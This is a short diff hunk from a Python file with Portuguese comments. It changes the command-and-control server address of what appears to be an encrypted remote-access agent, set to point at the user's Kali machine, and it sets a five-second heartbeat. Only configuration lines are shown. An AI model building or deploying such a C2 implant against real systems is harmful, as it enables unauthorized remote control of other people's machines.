@@ -20,7 +20,7 @@ import secrets
 # ============================================
 # CONFIGURAÇÕES DIRETAS (MUDE AQUI)
 # ============================================
-C2_URL = "http://192.168.1.100:5000"  # ← MUDE PARA IP DO SEU KALI
+C2_URL = "http://172.16.0.20:5000"  # ← MUDE PARA IP DO SEU KALI
 HEARTBEAT_INTERVAL = 5  # segundos
 
 class EncryptedAgent:
